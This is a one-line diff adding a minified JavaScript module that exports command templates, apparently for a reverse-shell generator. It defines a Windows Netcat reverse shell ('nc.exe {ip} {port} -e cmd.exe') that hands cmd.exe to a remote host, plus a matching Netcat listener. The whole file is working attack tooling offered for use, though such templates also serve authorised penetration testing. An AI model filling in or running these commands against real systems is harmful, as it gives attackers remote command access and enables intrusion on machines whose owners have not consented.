@@ -1,0 +1,1 @@
+const e=[{title:"Windows Netcat -e reverse shell",template:"nc.exe {ip} {port} -e cmd.exe",description:"Windows Netcat variant using cmd.exe for reverse shell access."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
